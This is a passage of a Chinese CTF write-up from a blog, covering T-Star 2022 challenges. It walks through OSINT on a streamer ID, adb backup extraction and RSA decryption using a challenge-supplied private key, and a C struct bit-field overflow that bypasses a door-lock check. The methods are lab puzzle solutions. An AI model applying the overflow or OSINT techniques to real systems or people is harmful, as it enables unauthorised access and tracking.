+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">&gt;</span></span>any text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</blockquote>
+<h2 id="赛题二-ID背后"><a href="#赛题二-ID背后" class="headerlink" title="赛题二 ID背后"></a>赛题二 ID背后</h2><blockquote>
+<p>你紧盯着网站界面，这一番功夫下来，除了这个ID，你一无所获。可惜，ID不会说话。</p>
+<p>等等……ID，真的不会说话吗？这个ID……会不会藏着更多信息？有没有可能，定位到这个ID背后的主人，究竟在在哪里？</p>
+<p>提示：答案为城市名(限中文/小写英文) eg. 北京或者beijing</p>
+</blockquote>
+<p>试了下上一题 <code>/api/info</code> 那里返回的信息，成都，不对。</p>
+<p>瞄了眼直播间的 ID，nightBaron042，还有个 [ TIPS ] 欢迎关注主播的微博</p>
+<p><a target="_blank" rel="noopener" href="https://weibo.com/u/7704722851">https://weibo.com/u/7704722851</a></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421170057786.png"></p>
+<p>视频里有个 ID yuyangzhou</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421164150345.png"></p>
+<p>搜了下反正也是腾讯的员工。</p>
+<p>随便猜一下 <strong>深圳</strong> 吧，噢对了。（跑</p>
+<blockquote>
+<p>官方解答是那条微博里两张图 diff，不同点的坐标作为经纬度得到是深圳，唔，反正盲猜也不是不行（</p>
+</blockquote>
+<h2 id="赛题三-视线之外"><a href="#赛题三-视线之外" class="headerlink" title="赛题三 视线之外"></a>赛题三 视线之外</h2><blockquote>
+<p>一不做二不休，你决定索性去目的地一探究竟。</p>
+<p>你跟着指示一路找了过来，发现自己站在一扇紧锁的大门前。刚一靠近，门禁系统就发生了刺耳的警告声。</p>
+<p>硬闯显然是不可能的，你紧盯着大门上的标志，突然灵光一现：试试捕捉流量吧！</p>
+<p>果然，你捕捉到了一段流量！这个里面，会不会有你需要的关键信息？</p>
+<p><a target="_blank" rel="noopener" href="http://175.178.148.197/031ocvpfrc1b79a0f61/pkt">http://175.178.148.197/031ocvpfrc1b79a0f61/pkt</a></p>
+<p>提示：包含多个小关卡，请提交最后一关答案，答案不带T-Star{}.</p>
+</blockquote>
+<p>流量包啊，看起来是 adb 的流量。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421012539296.png"></p>
+<p>得到 pass: <code>yun202203</code></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421012502221.png"></p>
+<p>看起来是 adb backup，是安卓系统备份文件ab格式。</p>
+<p>选择原始数据导出来，再去掉多余的 <code>OKAY</code>，得到纯粹的 <code>.ab</code> 文件。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421022337138.png"></p>
+<p>利用 <a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor">Android backup extractor</a> 和前面的密码，将备份文件解包。</p>
+<blockquote>
+<p>Utility to extract and repack Android backups created with <code>adb backup</code> (ICS+). Largely based on <code>BackupManagerService.java</code> from AOSP.</p>
+<p>可以直接下载打包好的 jar</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor/releases/">https://github.com/nelenkov/android-backup-extractor/releases/</a></p>
+<p>另外需要用高版本的 java 来运行。</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar abe.jar unpack data.ab data.tar yun202203<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421021621960.png"></p>
+<p>瞄一下得到的 tar</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421022112365.png"></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421022125246.png"></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421022153268.png"></p>
+<p>有一个 apk，也就是 backup 指定的那个。</p>
+<p>逆向看看。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421022810865.png"></p>
+<p><code>Step1.class</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ctf<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>step</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Step1</span> <span class="token punctuation">{</span>
+   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">FlagStep1</span> <span class="token operator">=</span> <span class="token string">"175.178.148.197:80"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>MainActivity.class</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ctf<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>step</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>support<span class="token punctuation">.</span>v7<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">AppCompatActivity</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">{</span>
+   <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token number">2131296283</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得了 Flag 第一部分，也就是那个 IP。其他的文件翻了挺多没找到啥有意义的？</p>
+<p>再看这个压缩包 <code>.d.zip</code></p>
+<p><code>private_key.pem</code></p>
+<pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----
+MIICXQIBAAKBgQCkbqcFM+hbrP+3DERi3gJY9rfwVhzAmBzbgpCAxnWO/Ip1OKtF
+RgSyqxJnzzptHTFvqbUbP/+Umqm/MfwrorYHyr3rfm70yM4qX4bpYCIWMkzeplEx
+V9Y3o3pVw7w/ISTzRVO5Woi/eyTDgVwguOKb9Fi9QLjCrxeWL9AtsKnsawIDAQAB
+AoGBAJac2BV250VZn9yNuvIIQoQ0cGUOq0VpzzztSej6X2G6RiR65L4OFW2GLtSx
+RuX9EHQkMUQlibgXNpZvdXiOkEX44W14JisHfJ2fCLdUKjr/aqDSR3Yo8+raaght
+FUIZyJQG1SqJM+PV2HqKPOW3+IQ6HRAxST+H0l5sUqWPmjQpAkEA0jZHZOV1UJdJ
+MK+iXHjpGHaXz5u6MlNuRaLioBjcvCzduZgmFuazMwkVBqy7l6R4UOMqt4HRbkUi
+5uwfZnbDdwJBAMg/oJz07C4cHmci9J5NNHruToc3JEQz8pmBAKwlM9IKwEtr8NHM
+4sIiW7i1K2RVHs3Uxi7iVnGHT6sF/ErKE60CQQCMGGqaXqZB0KGRlevyDw7iI99n
+GFUORzYdqMG6ivdJXeljUHhKGPRi1fGyYhofpRgeaFdGt3j5MZBiMAl5QztfAkAy
+DV1a/gkuuU6MHvufudJ9S6WLPKgu+AESh2Egpifev1szPuaxuhGPzsC4WWhgKrqJ
+Xj6vJ1nOBLFQIS3fj8T9AkAqFjwCoZjy8cvI2/xyJa65NqeWsPI8rHB76cSmsdhb
+3Gtz+ZNfPpVF5pN3F0/eMdA7VsOlc4Ea40DlHIY9Yjdg
+-----END RSA PRIVATE KEY-----
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>key.en</code> 大概率是加密的签名，网上找个工具解密一下。</p>
+<p><a target="_blank" rel="noopener" href="https://www.bejson.com/enc/rsa/">https://www.bejson.com/enc/rsa/</a></p>
+<p>需要把密文 base64 编码一下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> key.en <span class="token operator">|</span> base64
+ch/mu/NWBxYPZLqN1BD/eXm5IogOvubhhvJxQNqMtX9tm7zaM/xiq0cOGiFBkakf0FAOObLqnpf5
+<span class="token number">7</span>+mp5b47QX/GQoXCmexyESXXiAVCQYNQ9JD2HPyb2FJsqhHKxlou6cbPSWKoxbLqm89AKtZOObMk
+<span class="token assign-left variable">kOZgm8qF91gUrR3Vd8Y</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421224511539.png"></p>
+<blockquote>
+<p>或者用 <a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptrsaprikey">http://tool.chacuo.net/cryptrsaprikey</a> 也行</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421224848435.png"></p>
+<p>本地的话也可以拿 openssl 来</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ openssl rsautl -decrypt -in key.en -inkey private_key.pem -out key.de
+$ <span class="token function">cat</span> key.de         
+9BlteBJnZpwrRjbL0DsGlFz5M+MDG74jYIj0zzivGPVW75jYZQpdzpfrpEBcXAJqHrlZlEw9hMhRQ8FijkATyMxpKsPXEWT5K6M5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>加密的话类似于</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl rsautl -encrypt -in data.txt -inkey public.key -pubin -out data_en.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>后来发现直接 cyberchef 就能加解密（</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220427041030468.png"></p>
+</blockquote>
+<p>解密得到明文</p>
+<pre class="line-numbers language-none"><code class="language-none">9BlteBJnZpwrRjbL0DsGlFz5M+MDG74jYIj0zzivGPVW75jYZQpdzpfrpEBcXAJqHrlZlEw9hMhRQ8FijkATyMxpKsPXEWT5K6M5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>当作密码解压 <code>flag.zip</code>，内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>binary 转 ASCII 没啥可见字符。总共841字符，正好29*29. 盲猜是二维码，那画个图吧。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+MAX <span class="token operator">=</span> <span class="token number">29</span>
+pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"1111111010010101010110111111110000010100011000111101000001101110100110100101000010111011011101010000110001000101110110111010110100100101101011101100000100100111011001010000011111111010101010101010111111100000000001111001000000000000110011010000110101010011011110001110110101101011000011110000110100101110010010111111000100001101000011010000100000100100101101001011010010101111010011110100111101001110000011110100101101001011010010001110011101101111011001110000001001010101001100011001001001001110111111111111011101101001010111001101110111001001110111000001111100011001000010100110110011111011010100111110010001100100011110011001100000000001001010101101010111001111111010110001101000101001010000011100111110010001000100101110101010011111111110111101011101000000010000000000111010111011110001010110111001110100000101110011101101110011101111111"</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
+pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
+pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到一个二维码</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/flag.png"></p>
+<p>扫码得到</p>
+<pre class="line-numbers language-none"><code class="language-none">/033yia8rqea1921ca61/systemlockdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>拼一下，访问 <a target="_blank" rel="noopener" href="http://175.178.148.197/033yia8rqea1921ca61/systemlockdown">http://175.178.148.197/033yia8rqea1921ca61/systemlockdown</a></p>
+<p>得到一个文件，是个 zip 压缩包。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421213620514.png"></p>
+<p><code>readme</code></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">门禁用的是Windows <span class="token number">10</span>，x86系统……经过一番分析，你成功拿到了门禁系统源码，可喜的是，门禁认证系统已经写死，即使是管理员也无法更新。
+但，就在破解源码的过程中，管理员也觉察到门禁源码泄露，提前关闭了门禁系统，你输入的密码将无法认证。
+时间一分一秒过去，不能再犹豫了，需要立即输入密码，解锁门禁。
+
+PS<span class="token operator">:</span> MSVC <span class="token number">2015</span>以后的版本编译，Debug，不开启任何优化，请以提供的附加材料为准（Binary与下列源码表现一致，输入的答案通过与否请以该Binary的输出为准）。
+flag：如果你认为输入<span class="token number">12345</span>可以解锁门禁，则请提交答案：<span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span>
+
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
+
+<span class="token keyword">struct</span> <span class="token class-name">door_key</span> <span class="token punctuation">{</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> passed <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> checksum1 <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> checksum2 <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> checksum3 <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token comment">//The system doesn't allow ANYBODY to log in now.</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYSTEM_SHUTDOWN</span> <span class="token expression"><span class="token number">1</span></span></span>
+
+<span class="token keyword">void</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> password<span class="token punctuation">,</span> door_key<span class="token operator">*</span> d<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>SYSTEM_SHUTDOWN<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">return</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token string">"888888"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		d<span class="token operator">-&gt;</span>passed <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+		d<span class="token operator">-&gt;</span>checksum1 <span class="token operator">=</span> <span class="token number">88</span><span class="token punctuation">;</span>
+		d<span class="token operator">-&gt;</span>checksum2 <span class="token operator">=</span> <span class="token number">88</span><span class="token punctuation">;</span>
+		d<span class="token operator">-&gt;</span>checksum3 <span class="token operator">=</span> <span class="token number">88</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">call_the_police</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	<span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	door_key<span class="token operator">*</span> checker1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
+
+	<span class="token keyword">struct</span> <span class="token punctuation">{</span> 
+		<span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token keyword">char</span> key_data<span class="token punctuation">;</span>
+	<span class="token punctuation">}</span> management <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> last_ch <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>SYSTEM_SHUTDOWN<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Notify from the administrator: NOBODY is allowed to login now!!!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
+		std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"YOUR LOGIN REQUEST WILL NOT BE HANDLED AND WE WILL CALL THE POLICE INSTANTNLY IF YOU DIDN'T PASS THE CHECK."</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+retry<span class="token operator">:</span>
+	std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Please enter your 6-digit password, type '[6 digit number] then Enter' to confirm (For example: 123456): "</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		ch <span class="token operator">=</span> std<span class="token operator">::</span>cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+			<span class="token keyword">break</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isdigit</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+			<span class="token function">call_the_police</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+		<span class="token comment">// Developer A:</span>
+		<span class="token comment">//  Add an easy check, our strong 6-digit password is 888888 ! </span>
+		<span class="token comment">//  Pre-check if every digit is the same. </span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token string">'\n'</span> <span class="token operator">&amp;&amp;</span> last_ch <span class="token operator">&amp;&amp;</span> ch <span class="token operator">!=</span> last_ch<span class="token punctuation">)</span> 
+			<span class="token function">call_the_police</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		
+		last_ch <span class="token operator">=</span> ch<span class="token punctuation">;</span>
+		management<span class="token punctuation">.</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch<span class="token punctuation">;</span>
+	<span class="token punctuation">}</span><span class="token punctuation">;</span> 
+
+	checker1 <span class="token operator">=</span> <span class="token punctuation">(</span>door_key <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>management<span class="token punctuation">.</span>key_data<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+	<span class="token function">check</span><span class="token punctuation">(</span>management<span class="token punctuation">.</span>password<span class="token punctuation">,</span> checker1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>checker1<span class="token operator">-&gt;</span>passed <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>checker1<span class="token operator">-&gt;</span>checksum1 <span class="token operator">==</span> checker1<span class="token operator">-&gt;</span>checksum2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> checker1<span class="token operator">-&gt;</span>checksum3 <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Congurations! You have entered the correct password."</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+	<span class="token keyword">else</span>
+		<span class="token function">call_the_police</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>还给了二进制文件。</p>
+<p>喵喵不大会逆向，静态+动态分析了一下，由于开了 debug，不大好逆，摸了。</p>
+<p>不过可以知道的是，可以输入7位字符，如果最后一位非 <code>\n</code> 且非 0x00，那就能溢出让 <code>checker1-&gt;passed</code> 为真。</p>
+<p>同时 <code>checker1 = (door_key *)&amp;(management.key_data); </code> 这里会把最后一位字符强制转换为 <code>struct door_key</code>，最后校验的是 <code>(checker1-&gt;checksum1 == checker1-&gt;checksum2) &amp;&amp; checker1-&gt;checksum3 &gt; 0</code>。</p>
+<p>又根据代码和注释，输入的每一位数字应该都是相同的。</p>
+<p>随便试了试，7个5就成功了。</p>
+<p>md5(5555555)</p>
+<p>992e63080ee1e47b99f42b8d64ede953</p>
+<blockquote>
+<p>其实原理是 这个 ASCII char 的值的每一个 bit 强制转换到这个结构体的每一 bit。</p>
+<p>而 <code>5</code> 的 ASCII 对应了 0x35，即 00110101，分配到 struct 就变成了</p>
+<p>passed = 1 / checksum = 01 / checksum2 = 01 / checksum3 = 001</p>
+<p>于是就满足条件了，而其他数字都不符合。</p>
+</blockquote>
+<blockquote>
+<p><strong>References &amp; Extended Reading</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://lcx-666-github-io.vercel.app/2021/03/20/ab%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/">.ab 文件逆向分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://sqlitebrowser.org/dl/">https://sqlitebrowser.org/dl/</a></li>
+<li><a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/topic/android-hacking-security-part-15-hacking-android-apps-using-backup-techniques/">Hacking android apps using backup techniques</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/092c7c46866d">adb命令备份恢复手机信息</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/wnagzihxa1n/CTF-Mobile-Tutorial/blob/master/2015XCTF-RCTF/flag-system-100/WriteUp.md">2015XCTF-RCTF 第一道Mobile题</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html">利用openssl进行RSA加密解密</a></li>
+</ul>
+</blockquote>
+<h2 id="赛题四-人去楼空"><a href="#赛题四-人去楼空" class="headerlink" title="赛题四 人去楼空"></a>赛题四 人去楼空</h2><blockquote>
+<p>终于成功解开了门禁！进入了紧闭的房间，这里似乎曾经是一个总部实验室，然而此刻已是人去楼空，房间里空荡荡的，一个人都没有。</p>
+<p>看来，不管这里曾经是谁在这里，房间里的秘密都已经随着主人一起离开了。</p>
+<p>突然，一股刺耳的闹钟铃声划破寂静——</p>
+<p>竟然有人在这里留了一部手机？难道说，你的一举一动都在人的意料之中？</p>
+<p>铃声不知疲倦地响着，似乎笃定了你会接。</p>
+<p>你拿起了手机。</p>
+<p>这里面是有什么信息吗？</p>
+<p><a target="_blank" rel="noopener" href="http://175.178.148.197/b378603d0266d73e743c8d05f5bc3ebe.zip">http://175.178.148.197/b378603d0266d73e743c8d05f5bc3ebe.zip</a></p>
+<p>提示：需要修复二维码与压缩包，分析出压缩包密码，答案为解压后的TXT内容</p>
+</blockquote>
+<p>解压得到一个 <code>破镜重圆</code> 文件夹</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/%E6%AE%8B%E7%BC%BA%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81.jpg" alt="残缺的二维码"></p>
+<p>熟练地打开 ps，复制一个定位块到左上角</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/%E6%AE%8B%E7%BC%BA%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81_fix.jpg" alt="残缺的二维码_fix"></p>
+<p>扫码得到 <a target="_blank" rel="noopener" href="https://public.huoxian.cn/ctf/call_me.zip">https://public.huoxian.cn/ctf/call_me.zip</a></p>
+<p>下载下来里面有个加密的 <code>flag.txt</code>，看来得从另一个 <code>我真是一个压缩包.zip</code> 里拿解压密码了。</p>
+<p>010editor 瞄一眼，发现头部文件头被改了，改回去 504B0304</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421004341560.png"></p>
+<p>解压得到 <code>永不消逝的电波.mp3</code></p>
+<p>啊，又是熟悉的 Morse。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421004435428.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">.---- ----. ----. .---- ----- ...-- ---.. -.... --... ----. --...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
